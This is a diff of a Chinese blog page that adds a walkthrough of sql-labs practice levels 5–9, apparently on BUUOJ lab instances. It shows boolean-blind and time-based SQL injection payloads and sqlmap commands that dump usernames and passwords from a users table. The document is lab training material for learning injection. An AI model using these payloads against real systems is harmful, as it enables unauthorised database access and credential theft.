@@ -188,11 +188,74 @@ level 1GET传参 ?id&amp;#x3D;1
 <h1 id="level-5"><a href="#level-5" class="headerlink" title="level 5"></a>level 5</h1><p>id&#x3D;1，回显了一个 “You are in”<br><img src="/SNIPER_FILE/2056d2fe10bbf187f0108da429847a99_MD5.jpeg"></p>
 <p>单引号报错<br><img src="/SNIPER_FILE/54ae93969a70a1a642189e336a6dda0d_MD5.jpeg"></p>
 <p>是字符型<br><img src="/SNIPER_FILE/e680cadad695f0424ad2531e6153ce7d_MD5.jpeg"></p>
-<p>爆列数：</p>
+<p>爆列数，是三列：</p>
 <pre class="line-numbers language-text" data-language="text"><code class="language-text">id=1' union select 1,2,3--+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <p><img src="/SNIPER_FILE/7df21af07b6ff5f2b32d87c9deab9bda_MD5.jpeg"></p>
-<p>但是没有回显点，bool盲注</p>
-<p>爆库：</p>
+<p>只有“You are in”来判断是否成功，bool盲注</p>
+<ul>
+<li>爆库：<br>先测库名长度，最终测出来8位时有回显<pre class="line-numbers language-text" data-language="text"><code class="language-text">1' and length(database())=8 --+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<img src="/SNIPER_FILE/6b32306fa6ddf4c723ff7668c75ce814_MD5.jpeg"></li>
+</ul>
+<p>然后测库名，先测第一个字符，测出为 ‘s’</p>
+<pre class="line-numbers language-text" data-language="text"><code class="language-text">1' and ascii(substr(database(),1,1))=115 --+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p><img src="/SNIPER_FILE/74e9368bbfcd6de2da35d01d3260ec3e_MD5.jpeg"></p>
+<p>测出了注入点，sqlmap直接梭即可</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">python sqlmap.py <span class="token parameter variable">-u</span> http://7796490a-d8c6-4484-a4f4-93f46c2e3466.node5.buuoj.cn/Less-5?id<span class="token operator">=</span><span class="token number">1</span> <span class="token parameter variable">-p</span> <span class="token string">'id'</span> <span class="token parameter variable">--technique</span> B --current-db <span class="token parameter variable">--batch</span> <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p><img src="/SNIPER_FILE/f334bf44aa25e575e5f5b197c8c300f0_MD5.jpeg"></p>
+<ul>
+<li><p>爆表</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">python sqlmap.py <span class="token parameter variable">-u</span> http://7796490a-d8c6-4484-a4f4-93f46c2e3466.node5.buuoj.cn/Less-5?id<span class="token operator">=</span><span class="token number">1</span> <span class="token parameter variable">-p</span> <span class="token string">'id'</span> <span class="token parameter variable">--technique</span> B <span class="token parameter variable">-D</span> <span class="token string">'security'</span> <span class="token parameter variable">--tables</span> <span class="token parameter variable">--batch</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p><img src="/SNIPER_FILE/6f2eaf7b5b20201ebae3d8f20a5c967c_MD5.jpeg"></p>
+</li>
+<li><p>爆字段</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">python sqlmap.py <span class="token parameter variable">-u</span> http://7796490a-d8c6-4484-a4f4-93f46c2e3466.node5.buuoj.cn/Less-5?id<span class="token operator">=</span><span class="token number">1</span> <span class="token parameter variable">-p</span> <span class="token string">'id'</span> <span class="token parameter variable">--technique</span> B <span class="token parameter variable">-D</span> <span class="token string">'security'</span> <span class="token parameter variable">-T</span> <span class="token string">'users'</span> <span class="token parameter variable">--columns</span> <span class="token parameter variable">--batch</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p><img src="/SNIPER_FILE/fe88ba57b2cac20d91ecbb8bdf3207db_MD5.jpeg"></p>
+</li>
+<li><p>爆数据</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">python sqlmap.py <span class="token parameter variable">-u</span> http://7796490a-d8c6-4484-a4f4-93f46c2e3466.node5.buuoj.cn/Less-5?id<span class="token operator">=</span><span class="token number">1</span> <span class="token parameter variable">-p</span> <span class="token string">'id'</span> <span class="token parameter variable">--technique</span> B <span class="token parameter variable">-D</span> <span class="token string">'security'</span> <span class="token parameter variable">-T</span> <span class="token string">'users'</span> <span class="token parameter variable">-C</span> <span class="token string">'username,password'</span> <span class="token parameter variable">--dump</span> <span class="token parameter variable">--batch</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li>
+</ul>
+<h1 id="level-6"><a href="#level-6" class="headerlink" title="level 6"></a>level 6</h1><p>还是GET参数</p>
+<p><code>1&#39;</code>单引号无反应，<code>1&quot;</code>双引号报错<br><img src="/SNIPER_FILE/a074dbb60681daab2c70772ff8eaafc6_MD5.jpeg"></p>
+<p><code>1&quot;--+</code>不报错，看来是字符型</p>
+<p>那就跟level5一样，只是把单引号换成双引号罢了</p>
+<h1 id="level-7"><a href="#level-7" class="headerlink" title="*level 7"></a>*level 7</h1><p><code>?id=1</code>，这次输出不一样了<br><img src="/SNIPER_FILE/822b5a2aad57c06891092c9e3f8a2a38_MD5.jpeg"></p>
+<p><code>1&#39;</code>单引号不再回显详细的错误信息，只提示语法有错误<br><img src="/SNIPER_FILE/fdf3fa4bcdc79579bfb20d03e3137d27_MD5.jpeg"></p>
+<p><code>1&#39; --+</code> 还是报错</p>
+<p><code>1&#39;&#39;</code>不报错了，id 应该是由单引号包裹的<br><img src="/SNIPER_FILE/dcc8577f74b559276161d9bd16cea6a6_MD5.jpeg"></p>
+<p><code>1&#39;)--+</code>加个括号，还是报错</p>
+<p><code>1&#39;))--+</code>双括号，不报错了！看来id是 <code>((&#39;id&#39;))</code> 包裹的<br><img src="/SNIPER_FILE/6db41c0f6345366db261c7c7573ae260_MD5.jpeg"></p>
+<ul>
+<li><p>测试注入点，成功正常返回，说明有3列</p>
+<pre class="line-numbers language-text" data-language="text"><code class="language-text">1')) union select 1,2,3--+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p><img src="/SNIPER_FILE/0a2c9f79dbf0531a0fa3eb68c54a6608_MD5.jpeg"></p>
+</li>
+<li><p>爆库<br>测试库名长度</p>
+<pre class="line-numbers language-text" data-language="text"><code class="language-text">1')) and length(database())=8--+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li>
+</ul>
+<p>后面的就跟level5一样了</p>
+<h1 id="level-8"><a href="#level-8" class="headerlink" title="level 8"></a>level 8</h1><p>GET传参?id&#x3D;1<br><img src="/SNIPER_FILE/6ca284ff4431e10c997b860c7911a800_MD5.jpeg"></p>
+<p><code>1&#39;</code>加个单引号，没回显了<br><img src="/SNIPER_FILE/840d6751977e36851724df91dcd1452c_MD5.jpeg"></p>
+<p><code>1&#39; --+</code>回显成功<br><img src="/SNIPER_FILE/2a592df9d1d5da0d38ac10a95bcd3f8d_MD5.jpeg"></p>
+<p>测试注入点，有三列</p>
+<pre class="line-numbers language-text" data-language="text"><code class="language-text">1' union select 1,2,3--+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>后面的就跟level5一样了</p>
+<h1 id="level-9"><a href="#level-9" class="headerlink" title="level 9"></a>level 9</h1><p>GET传参</p>
+<p><code>1&#39;</code>单引号，没反应<br><code>1&quot;</code>双引号，没反应</p>
+<p>可能是时间盲注，测一下</p>
+<pre class="line-numbers language-text" data-language="text"><code class="language-text">1' and if(1=2,1,sleep(5)) --+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p><img src="/SNIPER_FILE/ecba818f8ec4f46dbe4d85156950cce2_MD5.jpeg"><br>成功延迟</p>
+<ul>
+<li>爆库<br>测试库名称长度，长度为8时不延迟<pre class="line-numbers language-text" data-language="text"><code class="language-text">1' and if(length(database())=8,1,sleep(5)) --+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li>
+</ul>
+<p>测试库名的第一个字符，115即’s’时不延迟</p>
+<pre class="line-numbers language-text" data-language="text"><code class="language-text">1' and if(ascii(substr(database(),1,1))=115,1,sleep(5)) --+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+
+<p>然后就直接上sqlmap了，爆库名：</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">python sqlmap.py <span class="token parameter variable">-u</span> <span class="token string">'http://8014c573-16a1-446b-b671-54736ab76628.node5.buuoj.cn/Less-9?id=1'</span> <span class="token parameter variable">-p</span> <span class="token string">'id'</span> <span class="token parameter variable">--technique</span> T <span class="token parameter variable">-o</span> --current-db <span class="token parameter variable">--batch</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p><img src="/SNIPER_FILE/d64997bbe7f46dadc52e3a26e14fff24_MD5.jpeg"></p>
+<p>然后正常爆库爆表爆字段即可</p>
 
 	  <div class="article-footer-copyright">
 
@@ -202,7 +265,7 @@ level 1GET传参 ?id&amp;#x3D;1
 	</div>
 
 	
-	<span id="/2024/12/22/SQL-labs%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/" class="leancloud-visitors view" data-flag-title="SQL-labs靶场通关">
+	<span id="/2024/12/28/sql-labs%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/" class="leancloud-visitors view" data-flag-title="SQL-labs靶场通关">
 		<em class="post-meta-item-text"> Page View </em> <i class="leancloud-visitors-count"></i>
 	</span>
 	
@@ -214,13 +277,12 @@ level 1GET传参 ?id&amp;#x3D;1
 
     
     
-    <a href="/2024/12/25/21.Payload Obfuscation - IPv4 IPv6Fuscation 有效负载混淆-IPV4 IPV6/" type="button" class="btn btn-default"><i
-                class="fa fa-arrow-circle-o-left"></i> Prev</a>
+    <a type="button" class="btn btn-default disabled"><i class="fa fa-arrow-circle-o-left"></i>Prev</a>
     
 
     <a href="/" type="button" class="btn btn-default"><i class="fa fa-home"></i>Home</a>
     
-    <a href="/2024/12/21/2024-12第三周2：normalbabynote/" type="button" class="btn btn-default ">Next<i
+    <a href="/2024/12/25/21.Payload Obfuscation - IPv4 IPv6Fuscation 有效负载混淆-IPV4 IPV6/" type="button" class="btn btn-default ">Next<i
                 class="fa fa-arrow-circle-o-right"></i></a>
     
 
@@ -279,7 +341,7 @@ new Valine(valineConfig);
 	
 	<div class="meta-widget">
 	<i class="fa fa-clock-o"></i>
-	2024-12-22 
+	2024-12-28 
 	</div>
 	
 
@@ -314,7 +376,7 @@ new Valine(valineConfig);
 	   <a data-toggle="collapse" data-target="#toc"><i class="fa fa-bars"></i></a>
 	   <div id="toc" class="toc collapse in">
 		   <span class="toc-title">Contents</span>
-			<ol class="toc-article"><li class="toc-article-item toc-article-level-1"><a class="toc-article-link" href="#level-1"><span class="toc-article-text">level 1</span></a></li><li class="toc-article-item toc-article-level-1"><a class="toc-article-link" href="#level-2"><span class="toc-article-text">level 2</span></a></li><li class="toc-article-item toc-article-level-1"><a class="toc-article-link" href="#level-3"><span class="toc-article-text">level 3</span></a></li><li class="toc-article-item toc-article-level-1"><a class="toc-article-link" href="#level-4"><span class="toc-article-text">level 4</span></a></li><li class="toc-article-item toc-article-level-1"><a class="toc-article-link" href="#level-5"><span class="toc-article-text">level 5</span></a></li></ol>
+			<ol class="toc-article"><li class="toc-article-item toc-article-level-1"><a class="toc-article-link" href="#level-1"><span class="toc-article-text">level 1</span></a></li><li class="toc-article-item toc-article-level-1"><a class="toc-article-link" href="#level-2"><span class="toc-article-text">level 2</span></a></li><li class="toc-article-item toc-article-level-1"><a class="toc-article-link" href="#level-3"><span class="toc-article-text">level 3</span></a></li><li class="toc-article-item toc-article-level-1"><a class="toc-article-link" href="#level-4"><span class="toc-article-text">level 4</span></a></li><li class="toc-article-item toc-article-level-1"><a class="toc-article-link" href="#level-5"><span class="toc-article-text">level 5</span></a></li><li class="toc-article-item toc-article-level-1"><a class="toc-article-link" href="#level-6"><span class="toc-article-text">level 6</span></a></li><li class="toc-article-item toc-article-level-1"><a class="toc-article-link" href="#level-7"><span class="toc-article-text">*level 7</span></a></li><li class="toc-article-item toc-article-level-1"><a class="toc-article-link" href="#level-8"><span class="toc-article-text">level 8</span></a></li><li class="toc-article-item toc-article-level-1"><a class="toc-article-link" href="#level-9"><span class="toc-article-text">level 9</span></a></li></ol>
 		</div>
 	
 	</div>
